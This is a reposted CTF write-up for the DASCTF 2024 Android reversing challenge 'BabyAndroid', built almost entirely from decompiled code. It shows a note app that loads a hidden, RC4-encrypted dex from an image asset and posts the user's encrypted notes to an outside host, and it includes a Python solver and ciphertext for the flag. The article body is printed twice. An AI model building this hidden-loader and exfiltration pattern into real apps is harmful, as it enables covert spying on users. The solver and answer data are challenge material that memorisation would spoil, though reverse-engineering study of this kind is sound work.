# DASCTF 2024赛题解析：Reverse-BabyAndroid

> 原文: https://www.ctfiot.com/197671.html
> ID: 197671

BabyAndroid

TwMkYUkg4bYsY0hL99ggYWnVjWyXQrWAdNmToB0eBXbS6wBzL6ktorjNWI9VOroTU4HgIUYyzGLp
cHzd1zNGT+bFZZI7IoxJwpcgXfdwW1LSmiNSP+PuSUsqAzNclF1nJ07b4tYyLWg0zTypbzWsLhOI
M+6uci3RFZLREUCALafi01M8mS+KMNxX1Pyn8mSP+KKKjQ5S5fasHRSn+L9qBFws0mWavpfI0QEi
Mgarxv0iGhYU8cfgonWyL70RvoXET5VUDP1vfYWIBLzzzaAqLC0OiMtUK3TTATSU7yijdgXm18OK
McGIke/NZIM6Sr5fL3t6psDOOkw2C/5uYrJVPn+D6U9KTL64bgREppDqMOvhvbhtuf/S3ASW/+rh
tPMtoaD8FxDg0wWSLZA53fQfNA==

at site.qifen.note.ui.Encrypto.encrypt(Encrypto.java:37)

package site.qifen.note.ui;

import android.util.Base64;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Encrypt0 {
 private static final String KEY = "DSACTF";
 private static final String TAG = "Encrypto";

 public static String encrypt(String data) throws Exception {
 MessageDigest sha = MessageDigest.getInstance("SHA-1");
 byte[] keyBytes = sha.digest(KEY.getBytes("UTF-8"));
 byte[] keyBytes16 = new byte[16];
 System.arraycopy(keyBytes, 0, keyBytes16, 0, 16);
 SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes16, "AES");
 Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
 cipher.init(1, secretKeySpec);
 byte[] encryptedBytes = cipher.doFinal(data.getBytes("UTF-8"));
 return Base64.encodeToString(encryptedBytes, 2);
 }
}

public byte[] loadData(String str) {
 try {
 InputStream open = getAssets().open(str);
 byte[] encryptedData = new byte[open.available()];
 open.read(encryptedData);
 open.close();
 byte[] key = "DASCTF".getBytes();
 return rc4Decrypt(key, encryptedData);
 } catch (IOException e) {
 Log.e("错误", "加载数据时发生错误", e);
 return null;
 }
 }

 private byte[] rc4Decrypt(byte[] key, byte[] data) {
 int[] S = new int[256];
 for (int i = 0; i < 256; i++) {
 S[i] = i;
 }
 int j = 0;
 for (int i2 = 0; i2 < 256; i2++) {
 j = ((S[i2] + j) + (key[i2 % key.length] & 255)) % 256;
 int temp = S[i2];
 S[i2] = S[j];
 S[j] = temp;
 }
 int i3 = data.length;
 byte[] result = new byte[i3];
 int i4 = 0;
 int j2 = 0;
 for (int k = 0; k < data.length; k++) {
 i4 = (i4 + 1) % 256;
 j2 = (S[i4] + j2) % 256;
 int temp2 = S[i4];
 S[i4] = S[j2];
 S[j2] = temp2;
 int t = (S[i4] + S[j2]) % 256;
 result[k] = (byte) (data[k] ^ S[t]);
 }
 return result;
 }

def to_unsigned_bytes(byte_list):
 return bytes([(b + 256) % 256 for b in byte_list])

your_byte_list = [数据]
converted_bytes = to_unsigned_bytes(your_byte_list)

with open('dump.dex', 'wb') as file:
 file.write(converted_bytes)

print("Data written to dump.dex")

package site.qifen.note.ui;

import android.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Encrypto {
 private static final String KEY = "DSACTF";
 private static final String TAG = "Encrypto";

 private static byte[] customHash(String input) {
 byte[] keyBytes = new byte[16];
 int[] temp = new int[16];
 for (int i = 0; i < input.length(); i++) {
 int charVal = input.charAt(i);
 for (int j = 0; j < 16; j++) {
 temp[j] = ((temp[j] * 31) + charVal) % 251;
 }
 }
 for (int i2 = 0; i2 < 16; i2++) {
 keyBytes[i2] = (byte) (temp[i2] % 256);
 }
 return keyBytes;
 }

 public static String encrypt(String data) throws Exception {
 byte[] keyBytes = customHash(KEY);
 SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
 Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
 cipher.init(1, secretKeySpec);
 byte[] encryptedBytes = cipher.doFinal(data.getBytes("UTF-8"));
 return Base64.encodeToString(encryptedBytes, 2);
 }
}

package site.qifen.note.ui;

import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import dalvik.system.InMemoryDexClassLoader;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import site.qifen.note.model.Note;
import site.qifen.note.model.sendRequest;
import site.qifen.note.util.NoteUtil;

class NoteActivity$EncryptAndSendTask extends AsyncTask<String, Void, String> {
 final NoteActivity this$0;

 private NoteActivity$EncryptAndSendTask(NoteActivity noteActivity) {
 this.this$0 = noteActivity;
 }

 @Override
 public String doInBackground(String... params) {
 String contentText = params[0];
 try {
 byte[] dexData = this.this$0.loadData("Sex.jpg");
 ByteBuffer dexBuffer = ByteBuffer.wrap(dexData);
 InMemoryDexClassLoader classLoader = null;
 if (Build.VERSION.SDK_INT >= 26) {
 classLoader = new InMemoryDexClassLoader(dexBuffer, this.this$0.getClassLoader());
 }
 Class<?> checkerClass = classLoader.loadClass("site.qifen.note.ui.Encrypto");
 Method checkMethod = checkerClass.getMethod("encrypt", String.class);
 this.this$0.contentText_back = contentText;
 String cipher = (String) checkMethod.invoke(checkerClass.getDeclaredConstructor(new Class[0]).newInstance(new Object[0]), this.this$0.sendInit(contentText));
 String response = sendRequest.sendPost("http://yuanshen.com/", "data=" + cipher);
 Log.d("JNITest", "Server Response: " + response);
 return cipher;
 } catch (Exception e) {
 e.printStackTrace();
 return null;
 }
 }

 @Override
 public void onPostExecute(String cipher) {
 if (cipher != null) {
 String titleText = this.this$0.noteWriteTitleEdit.getText().toString();
 String tagText = this.this$0.noteWriteTagEdit.getText().toString();
 String date = new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date());
 if (NoteActivity.access$100(this.this$0) == null) {
 NoteActivity.access$200(this.this$0).insertNote(new Note(tagText, titleText, this.this$0.contentText_back, date, false));
 NoteUtil.toast("保存成功");
 this.this$0.finish();
 return;
 }
 NoteActivity.access$100(this.this$0).setTitle(titleText);
 NoteActivity.access$100(this.this$0).setContent(this.this$0.contentText_back);
 NoteActivity.access$100(this.this$0).setDate(date);
 NoteActivity.access$100(this.this$0).setTag(this.this$0.contentText_back);
 NoteActivity.access$200(this.this$0).updateNote(NoteActivity.access$100(this.this$0));
 NoteUtil.toast("修改成功");
 this.this$0.finish();
 return;
 }
 NoteUtil.toast("加密失败");
 }
}

v20 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);
StringUTFChars = _JNIEnv::
GetStringUTFChars(a1, a3, 0LL);
sub_15994(v19, StringUTFChars);
_JNIEnv::
ReleaseStringUTFChars(a1, a3, StringUTFChars);
v8 = sub_15A40(v19);
v7 = sub_15AB4(v19);
std::
vector::
vector<std::
__wrap_iter<char *>>(v18, v8, v7);
encrypt(v18);
sub_15C34(v16);
v15 = sub_15C74(v17);
v14 = sub_15CB4(v17);
while ( (sub_15CF0(&v15, &v14) & 1) != 0 )
{
 v3 = (std::
__ndk1 *)sub_15D38(&v15);
 std::
to_string(v3, *(double *)v3);
 sub_15D50(v12, ",");
 sub_15D98(v16, v13);
 std::
string::~string(v13);
 std::
string::~string(v12);
 sub_15E34(&v15);
}
if ( (sub_15E5C(v16) & 1) == 0 )
 sub_15EA0(v16);
v6 = (char *)sub_15FD4(v16);
v5 = _JNIEnv::
NewStringUTF(a1, v6);
std::
string::~string(v16);
sub_15668(v17);
sub_15FF8(v18);
std::
string::~string(v19);
_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));
return v5;
}

v12[1] = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);
 v10 = sub_15548(a1);
 v12[0] = 0LL;
 result = (double *)std::
vector<double>::
vector(a2, v10, v12);
 for ( i = 0; i < v10; ++i )
 {
 for ( j = 0; j < v10; ++j )
 {
 v7 = (double)*(int *)sub_15608(a1, j);
 v5 = cos(((double)j + 0.5) * ((double)i * 3.14159265) / (double)v10) * v7;
 v3 = (double *)sub_15638(a2, i);
 *v3 = *v3 + v5;
 }
 if ( i )
 v4 = sqrt(2.0 / (double)v10);
 else
 v4 = sqrt(1.0 / (double)v10);
 result = (double *)sub_15638(a2, i);
 *result = *result * v4;
 }
 _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));
 return result;
}

import numpy as np

def idct(dct_data):
 N = len(dct_data)
 result = np.zeros(N)

 for n in range(N):
 sum_value = 0.0
 for k in range(N):
 cos_term = np.cos((k * 3.14159265 * (n + 0.5)) / N)
 if k == 0:
 sum_value += dct_data[k] * np.sqrt(1.0 / N) * cos_term
 else:
 sum_value += dct_data[k] * np.sqrt(2.0 / N) * cos_term
 result[n] = sum_value

 return result

def decrypt_to_ascii(dct_data):
 # 执行IDCT解密
 decrypted_data = idct(dct_data)
 # 四舍五入并转化为整数
 int_data = np.rint(decrypted_data).astype(int)
 # 转换为ASCII字符
 char_data = [chr(num) for num in int_data]
 return ''.join(char_data)

# 使用 DCT 变换后的数据
encrypted_data = [458.853181,-18.325492,-18.251911,-2.097520,-21.198660,-22.304648,21.103162,-5.786284,-15.248906,15.329286,16.919499,-19.669045,30.928253,-37.588034,-16.593954,-5.505211,3.014744,6.553616,31.131491,16.472500,6.802400,-78.278577,15.280099,3.893073,56.493581,-34.576344,30.146729,4.445671,6.732204]

# 解密并转换为ASCII字符
decrypted_message = decrypt_to_ascii(encrypted_data)

# 打印解密后的消息
print("Decrypted message:", decrypted_message)

看雪ID：sffool

https://bbs.kanxue.com/user-home-988654.htm

*本文为看雪论坛优秀文章，由 sffool 原创，转载请注明来自看雪社区

# 往期推荐
1.告别RegisterNatives获取JNI函数绑定的地址，迎接最底层的方式获取（3个案例）

2.内核漏洞学习记录（CVE-2021-22555）

3.corCTF 2024：位运算虚拟机及gpu hash爆破

4.Charles + Clash + Postern 对外网 App Vpx 抓包

5.修补微信Windows隐藏的深色模式

点击阅读原文查看更多


```
TwMkYUkg4bYsY0hL99ggYWnVjWyXQrWAdNmToB0eBXbS6wBzL6ktorjNWI9VOroTU4HgIUYyzGLp
cHzd1zNGT+bFZZI7IoxJwpcgXfdwW1LSmiNSP+PuSUsqAzNclF1nJ07b4tYyLWg0zTypbzWsLhOI
M+6uci3RFZLREUCALafi01M8mS+KMNxX1Pyn8mSP+KKKjQ5S5fasHRSn+L9qBFws0mWavpfI0QEi
Mgarxv0iGhYU8cfgonWyL70RvoXET5VUDP1vfYWIBLzzzaAqLC0OiMtUK3TTATSU7yijdgXm18OK
McGIke/NZIM6Sr5fL3t6psDOOkw2C/5uYrJVPn+D6U9KTL64bgREppDqMOvhvbhtuf/S3ASW/+rh
tPMtoaD8FxDg0wWSLZA53fQfNA==
at site.qifen.note.ui.Encrypto.encrypt(Encrypto.java:37)
package site.qifen.note.ui;

import android.util.Base64;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Encrypt0 {
 private static final String KEY = "DSACTF";
 private static final String TAG = "Encrypto";

 public static String encrypt(String data) throws Exception {
 MessageDigest sha = MessageDigest.getInstance("SHA-1");
 byte[] keyBytes = sha.digest(KEY.getBytes("UTF-8"));
 byte[] keyBytes16 = new byte[16];
 System.arraycopy(keyBytes, 0, keyBytes16, 0, 16);
 SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes16, "AES");
 Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
 cipher.init(1, secretKeySpec);
 byte[] encryptedBytes = cipher.doFinal(data.getBytes("UTF-8"));
 return Base64.encodeToString(encryptedBytes, 2);
 }
}
public byte[] loadData(String str) {
 try {
 InputStream open = getAssets().open(str);
 byte[] encryptedData = new byte[open.available()];
 open.read(encryptedData);
 open.close();
 byte[] key = "DASCTF".getBytes();
 return rc4Decrypt(key, encryptedData);
 } catch (IOException e) {
 Log.e("错误", "加载数据时发生错误", e);
 return null;
 }
 }

 private byte[] rc4Decrypt(byte[] key, byte[] data) {
 int[] S = new int[256];
 for (int i = 0; i < 256; i++) {
 S[i] = i;
 }
 int j = 0;
 for (int i2 = 0; i2 < 256; i2++) {
 j = ((S[i2] + j) + (key[i2 % key.length] & 255)) % 256;
 int temp = S[i2];
 S[i2] = S[j];
 S[j] = temp;
 }
 int i3 = data.length;
 byte[] result = new byte[i3];
 int i4 = 0;
 int j2 = 0;
 for (int k = 0; k < data.length; k++) {
 i4 = (i4 + 1) % 256;
 j2 = (S[i4] + j2) % 256;
 int temp2 = S[i4];
 S[i4] = S[j2];
 S[j2] = temp2;
 int t = (S[i4] + S[j2]) % 256;
 result[k] = (byte) (data[k] ^ S[t]);
 }
 return result;
 }
def to_unsigned_bytes(byte_list):
 return bytes([(b + 256) % 256 for b in byte_list])

your_byte_list = [数据]
converted_bytes = to_unsigned_bytes(your_byte_list)

with open('dump.dex', 'wb') as file:
 file.write(converted_bytes)

print("Data written to dump.dex")
package site.qifen.note.ui;

import android.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Encrypto {
 private static final String KEY = "DSACTF";
 private static final String TAG = "Encrypto";

 private static byte[] customHash(String input) {
 byte[] keyBytes = new byte[16];
 int[] temp = new int[16];
 for (int i = 0; i < input.length(); i++) {
 int charVal = input.charAt(i);
 for (int j = 0; j < 16; j++) {
 temp[j] = ((temp[j] * 31) + charVal) % 251;
 }
 }
 for (int i2 = 0; i2 < 16; i2++) {
 keyBytes[i2] = (byte) (temp[i2] % 256);
 }
 return keyBytes;
 }

 public static String encrypt(String data) throws Exception {
 byte[] keyBytes = customHash(KEY);
 SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
 Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
 cipher.init(1, secretKeySpec);
 byte[] encryptedBytes = cipher.doFinal(data.getBytes("UTF-8"));
 return Base64.encodeToString(encryptedBytes, 2);
 }
}
package site.qifen.note.ui;

import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import dalvik.system.InMemoryDexClassLoader;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import site.qifen.note.model.Note;
import site.qifen.note.model.sendRequest;
import site.qifen.note.util.NoteUtil;

class NoteActivity$EncryptAndSendTask extends AsyncTask<String, Void, String> {
 final NoteActivity this$0;

 private NoteActivity$EncryptAndSendTask(NoteActivity noteActivity) {
 this.this$0 = noteActivity;
 }

 @Override
 public String doInBackground(String... params) {
 String contentText = params[0];
 try {
 byte[] dexData = this.this$0.loadData("Sex.jpg");
 ByteBuffer dexBuffer = ByteBuffer.wrap(dexData);
 InMemoryDexClassLoader classLoader = null;
 if (Build.VERSION.SDK_INT >= 26) {
 classLoader = new InMemoryDexClassLoader(dexBuffer, this.this$0.getClassLoader());
 }
 Class<?> checkerClass = classLoader.loadClass("site.qifen.note.ui.Encrypto");
 Method checkMethod = checkerClass.getMethod("encrypt", String.class);
 this.this$0.contentText_back = contentText;
 String cipher = (String) checkMethod.invoke(checkerClass.getDeclaredConstructor(new Class[0]).newInstance(new Object[0]), this.this$0.sendInit(contentText));
 String response = sendRequest.sendPost("http://yuanshen.com/", "data=" + cipher);
 Log.d("JNITest", "Server Response: " + response);
 return cipher;
 } catch (Exception e) {
 e.printStackTrace();
 return null;
 }
 }

 @Override
 public void onPostExecute(String cipher) {
 if (cipher != null) {
 String titleText = this.this$0.noteWriteTitleEdit.getText().toString();
 String tagText = this.this$0.noteWriteTagEdit.getText().toString();
 String date = new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date());
 if (NoteActivity.access$100(this.this$0) == null) {
 NoteActivity.access$200(this.this$0).insertNote(new Note(tagText, titleText, this.this$0.contentText_back, date, false));
 NoteUtil.toast("保存成功");
 this.this$0.finish();
 return;
 }
 NoteActivity.access$100(this.this$0).setTitle(titleText);
 NoteActivity.access$100(this.this$0).setContent(this.this$0.contentText_back);
 NoteActivity.access$100(this.this$0).setDate(date);
 NoteActivity.access$100(this.this$0).setTag(this.this$0.contentText_back);
 NoteActivity.access$200(this.this$0).updateNote(NoteActivity.access$100(this.this$0));
 NoteUtil.toast("修改成功");
 this.this$0.finish();
 return;
 }
 NoteUtil.toast("加密失败");
 }
}
v20 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);
StringUTFChars = _JNIEnv::
GetStringUTFChars(a1, a3, 0LL);
sub_15994(v19, StringUTFChars);
_JNIEnv::
ReleaseStringUTFChars(a1, a3, StringUTFChars);
v8 = sub_15A40(v19);
v7 = sub_15AB4(v19);
std::
vector::
vector<std::
__wrap_iter<char *>>(v18, v8, v7);
encrypt(v18);
sub_15C34(v16);
v15 = sub_15C74(v17);
v14 = sub_15CB4(v17);
while ( (sub_15CF0(&v15, &v14) & 1) != 0 )
{
 v3 = (std::
__ndk1 *)sub_15D38(&v15);
 std::
to_string(v3, *(double *)v3);
 sub_15D50(v12, ",");
 sub_15D98(v16, v13);
 std::
string::~string(v13);
 std::
string::~string(v12);
 sub_15E34(&v15);
}
if ( (sub_15E5C(v16) & 1) == 0 )
 sub_15EA0(v16);
v6 = (char *)sub_15FD4(v16);
v5 = _JNIEnv::
NewStringUTF(a1, v6);
std::
string::~string(v16);
sub_15668(v17);
sub_15FF8(v18);
std::
string::~string(v19);
_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));
return v5;
}
v12[1] = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);
 v10 = sub_15548(a1);
 v12[0] = 0LL;
 result = (double *)std::
vector<double>::
vector(a2, v10, v12);
 for ( i = 0; i < v10; ++i )
 {
 for ( j = 0; j < v10; ++j )
 {
 v7 = (double)*(int *)sub_15608(a1, j);
 v5 = cos(((double)j + 0.5) * ((double)i * 3.14159265) / (double)v10) * v7;
 v3 = (double *)sub_15638(a2, i);
 *v3 = *v3 + v5;
 }
 if ( i )
 v4 = sqrt(2.0 / (double)v10);
 else
 v4 = sqrt(1.0 / (double)v10);
 result = (double *)sub_15638(a2, i);
 *result = *result * v4;
 }
 _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));
 return result;
}
import numpy as np

def idct(dct_data):
 N = len(dct_data)
 result = np.zeros(N)

 for n in range(N):
 sum_value = 0.0
 for k in range(N):
 cos_term = np.cos((k * 3.14159265 * (n + 0.5)) / N)
 if k == 0:
 sum_value += dct_data[k] * np.sqrt(1.0 / N) * cos_term
 else:
 sum_value += dct_data[k] * np.sqrt(2.0 / N) * cos_term
 result[n] = sum_value

 return result

def decrypt_to_ascii(dct_data):
 # 执行IDCT解密
 decrypted_data = idct(dct_data)
 # 四舍五入并转化为整数
 int_data = np.rint(decrypted_data).astype(int)
 # 转换为ASCII字符
 char_data = [chr(num) for num in int_data]
 return ''.join(char_data)

# 使用 DCT 变换后的数据
encrypted_data = [458.853181,-18.325492,-18.251911,-2.097520,-21.198660,-22.304648,21.103162,-5.786284,-15.248906,15.329286,16.919499,-19.669045,30.928253,-37.588034,-16.593954,-5.505211,3.014744,6.553616,31.131491,16.472500,6.802400,-78.278577,15.280099,3.893073,56.493581,-34.576344,30.146729,4.445671,6.732204]

# 解密并转换为ASCII字符
decrypted_message = decrypt_to_ascii(encrypted_data)

# 打印解密后的消息
print("Decrypted message:", decrypted_message)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/8-1722855238.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/2-1722855239.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/2-1722855241.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/5-1722855243.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/1-1722855251.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/0-1722855253.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/4-1722855257.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/6-1722855259.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/1-1722855261.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/1-1722855261.png)